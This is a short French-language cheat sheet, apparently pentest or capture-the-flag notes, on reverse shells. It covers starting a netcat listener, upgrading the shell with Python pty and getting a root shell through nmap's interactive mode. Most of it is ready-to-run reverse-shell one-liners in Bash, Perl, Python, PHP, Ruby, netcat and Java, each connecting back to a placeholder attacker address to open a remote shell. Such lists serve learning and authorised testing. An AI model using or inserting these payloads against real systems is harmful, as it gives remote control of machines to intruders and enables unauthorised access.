
Un reverse shell est un code à éxécuter sur une machine cible dans le but de pouvoir executer du code shell en elle.

## __Setup Netcat Listener__

Démarrage d’un serveur **Netcat** pour être à l’**écoute d’un port**.

```shell
user@ip:~$ rlwrap nc -vnlp 1234
```

Attendez que votre [script](#__Scripts__) soit éxécuté.

Une fois le reverse shell en marche, pour switcher vers un **fully interactive shell**.

```shell
$ python -c 'import pty; pty.spawn("/bin/bash")';
```

On peut ensuite utiliser **`su`** pour se connecter.

## __Nmap --interactive__

Si notre utilisateur a les permissions d'utiliser nmap, on peut utiliser [nmap pour se connecter en root](https://gtfobins.github.io/gtfobins/nmap/#shell) sur notre shell, pour cela :

```shell
user@linux:/$ nmap --interactive
nmap> !sh
```

## __Scripts__

Pour générer des reverses shells vous pouvez utiliser le site de 0day, [revshells](https://www.revshells.com/)

### Bash

```bash
bash -i >& /dev/tcp/MACHINE_IP/1234 0>&1
```

### Perl

```perl
perl -e 'use Socket;$i="MACHINE_IP";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MACHINE_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Php

```php
php -r '$sock=fsockopen("MACHINE_IP",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("MACHINE_IP",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

```shell
nc -e /bin/sh MACHINE_IP 1234
```

### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/MACHINE_IP/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
